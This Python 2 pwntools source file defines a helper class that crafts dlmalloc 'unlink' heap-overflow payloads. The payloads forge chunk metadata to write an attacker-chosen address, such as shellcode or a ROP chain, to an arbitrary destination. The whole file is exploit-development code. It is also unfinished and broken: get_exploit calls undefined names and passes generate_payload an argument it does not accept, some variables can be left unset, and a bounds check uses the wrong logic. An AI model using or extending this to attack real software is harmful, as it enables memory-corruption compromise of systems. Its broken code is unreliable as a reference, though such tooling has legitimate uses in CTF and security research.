
from pwn import *

# TODO support for overwriting using forward consolidation
# TODO support for overwriting using forward consolidation only
# TODO edgecase that metadata's prevsize can be used as size
# TODO add support for arch 32 and 64
# TODO support for overwriting using frontlink method
# TODO what if we can overwrite ONLY the metadata of C

"""
Terminology :
    Block whose metadata is being overwritten and later freed     :    "C"
    Block that is 'before' C(crafted block)                       :    "BEFORE_C"
    Block that is 'after'  C(crafted block)                       :    "AFTER_C"
"""

class HeaplibException(Exception):
    pass

class HeapPayloadCrafter(object):
    def __init__(self, destination, source, **kw):
        """
        destination    :   Address to which `source` must be written out to.
        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
                           must be writable
        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
        """
        self.destination          = destination
        self.source               = source
        self.destination_2        = kw.get("destination_2", None)
        self.source_2             = kw.get("source_2", None)
        self.size                 = kw.get("size", 4)
        self.only_fwd_consol      = kw.get("only_fwd_consol", False)
        self.allocator            = kw.get("allocator", "dlmalloc")
        self.pre_length           = kw.get("pre_length", None)
        self.post_length          = kw.get("post_length", None)
        self.pre_preset           = kw.get("pre_preset", {})
        self.post_preset          = kw.get("post_preset", {})
        self.populating_character = kw.get("populating_character", "*")

    def can_use(self, content, start, length):
        print repr(content[start: start+length])
        print repr([self.populating_character] * length)
        return content[start: start+length] == [self.populating_character] * length

    def populate_content(self, **kw):
        presets = kw.get("presets", None)
        length = kw.get("length", None)

        full_content = [self.populating_character] * length
        for offset in presets:
            content = presets[offset]
            start, end = offset, offset + len(content)

            if start < 0 and start >= length:
                raise HeaplibException("Invalid start offset when populating content")
            elif end > length:
                raise HeaplibException("Invalid end offset(%d) when populating content. Length=%d" % (end, length))

            if not self.can_use(full_content, start, len(content)):
                raise HeaplibException("Offset (%d: %d) is already used" %(start, start+len(content)))
            full_content[start:end] = content

        return full_content

    def generate_payload(self):
        """
        Generate the payload that will be used to perform arbitrary memory
        writes during unlink.
        """

        prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
        post = self.populate_content(presets=self.post_preset, length=self.post_length)
        metadata = ""

        # If we can use backward consolidation to write the exploit
        if not self.only_fwd_consol:
            # Find a contiguous chunk of (self.size*4) bytes that can
            # be used
            i, unit_len = 0, self.size*4
            while True:
                segment = post[i: i+unit_len]
                if len(segment) != unit_len:
                    print "Backward consolidation not possible. Attempting "\
                          "Forward consolidation."
                    self.only_fwd_consol = True
                    break
                elif self.can_use(segment, 0, len(segment)):
                    PREV_SIZE_C = -(i + (self.size*2))
                    before_c = flat(0xfffffff0, 0xfffffff1, self.destination-12, self.source)
                    post[i:i+unit_len] = list(before_c)
                    assert len(post) == self.post_length
                    break
                i += 1

        # If we need to use forward consolidation
        if self.only_fwd_consol or (self.destination_2 and self.source_2):
            raise HeaplibException("Forward consolidation not supported yet.")
            pass
        # If no forward consolidation, fill with values that don't cause
        # a crash
        else:
            # Find a contiguous chunk towards the end of `prev` that can be
            # used to place
            i, unit_len = len(prev), self.size*2
            i -= unit_len
            if False:
            #if prev[-4:] == [self.populating_character]*self.size:
                SIZE_C = -4
                after_c = flat(0x41414141)
                prev[-4:] = list(after_c)
            else:
                while True:
                    print i, unit_len
                    segment = prev[i: i+unit_len]
                    if i < 0 or (len(segment) != unit_len):
                        raise HeaplibException("Not enough space when performing forward consolidation")
                        break
                    elif self.can_use(segment, 0, len(segment)):
                        SIZE_C = -i
                        after_c = flat(0xfffffff0, 0xfffffff8)
                        prev[i:i+unit_len] = list(after_c)
                        assert len(prev) == self.pre_length
                        break
                    i -= 1
            SIZE_C |= 1

        return PREV_SIZE_C, post, SIZE_C, prev

    def get_exploit(self):
        """
        The exploit returned will be in 2 parts.
        - The first part will contain data upto the part that
        is intended to overwrite the header of the next chunk.
        - The second part is supposed to be the data part of the
        chunk who is about to be freed.

        Uses the 'unlink' method to craft 2 values :
        1. CraftedMetadata
            This should overwrite the metadata of the block
            being freed.
        2. CraftedBlock
            This should be places in memory right after the
            crafted memory i.e. as the data of the block
            being freed.
        """
        if self.allocator == "dlmalloc":
            if not bytes_to_nextheader:
                return str(CraftedMetadata()), str(CraftedBlock(self.source-12, self.destination))
            else:
                content = self.populate_content()
                payload = self.generate_payload(content)

        raise HeaplibException("Allocator not supported")

    def __str__(self):
        return ''.join(self.get_exploit())
